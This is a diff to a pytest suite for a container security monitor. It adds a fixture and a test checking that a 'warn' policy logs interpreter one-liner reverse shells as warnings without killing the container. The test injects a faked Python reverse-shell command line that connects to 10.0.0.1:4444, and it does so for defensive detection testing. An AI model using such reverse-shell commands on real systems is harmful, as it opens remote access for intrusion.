@@ -108,6 +108,41 @@ file_read_rate_mb_per_sec = 10000
 
 
 @pytest.fixture
+def enable_monitoring_oneliner_warn():
+    """Enable monitoring with reverse_shell_one_liners = "warn" (#842).
+
+    Downgrades the interpreter one-liner reverse-shell class to WARNING (audited,
+    never kills), while auto_kill_on_critical stays on for the unambiguous class.
+    """
+    config_path = Path.home() / ".coi" / "config.toml"
+    backup = config_path.read_text() if config_path.exists() else None
+
+    config_path.parent.mkdir(parents=True, exist_ok=True)
+    config_path.write_text(
+        """
+[network]
+mode = "open"
+
+[monitoring]
+enabled = true
+auto_pause_on_high = true
+auto_kill_on_critical = true
+reverse_shell_one_liners = "warn"
+poll_interval_sec = 1
+file_read_threshold_mb = 500
+file_read_rate_mb_per_sec = 1000
+"""
+    )
+
+    yield config_path
+
+    if backup:
+        config_path.write_text(backup)
+    elif config_path.exists():
+        config_path.unlink()
+
+
+@pytest.fixture
 def enable_monitoring_low_thresholds():
     """Enable monitoring with default low thresholds for threshold-specific tests.
 
@@ -471,6 +506,49 @@ class TestThreatDetection:
             ]
             assert reverse_shell_critical, (
                 f"Expected a reverse-shell CRITICAL event for {wrapped!r}. Events: {events}"
+            )
+        finally:
+            proc.terminate()
+            cleanup_container(container_name, coi_binary)
+
+    def test_oneliner_warn_policy_downgrades_but_still_audits(
+        self, test_workspace, enable_monitoring_oneliner_warn, coi_binary
+    ):
+        """With reverse_shell_one_liners = "warn" (#842), a genuine interpreter
+        one-liner reverse shell (socket + IP) is downgraded to WARNING: it is
+        logged and audited but does NOT kill the container. The unambiguous
+        class stays critical (covered by test_interpreter_reverse_shell_still_killed
+        and test_critical_threat_kills_container)."""
+        container_name, proc = self._start_shell(test_workspace, coi_binary, 79)
+        try:
+            # Real python reverse shell (socket + IP) — one-liner class.
+            self._inject_faked_process(
+                container_name,
+                "python3 -c import socket,subprocess,os;s=socket.socket();"
+                's.connect(("10.0.0.1",4444))',
+            )
+
+            # Give the monitor several poll cycles.
+            time.sleep(8)
+
+            # WARN must not kill or pause the container.
+            assert not container_absent(container_name), (
+                "warn policy must NOT kill the container on a one-liner reverse shell"
+            )
+            state = get_container_state(container_name)
+            assert state == "Running", f"warn policy should keep container Running, got {state}"
+
+            # But the threat must still be audited — as WARNING, not CRITICAL.
+            events = get_threat_events(container_name)
+            rs_events = [e for e in events if "reverse shell" in e.get("description", "").lower()]
+            assert rs_events, (
+                f"Expected an audited reverse-shell event under warn. Events: {events}"
+            )
+            assert any(e.get("level") == "warning" for e in rs_events), (
+                f"Expected a WARNING-level reverse-shell event under warn policy, got {rs_events}"
+            )
+            assert not any(e.get("level") == "critical" for e in rs_events), (
+                f"warn policy must not emit a CRITICAL reverse-shell event, got {rs_events}"
             )
         finally:
             proc.terminate()
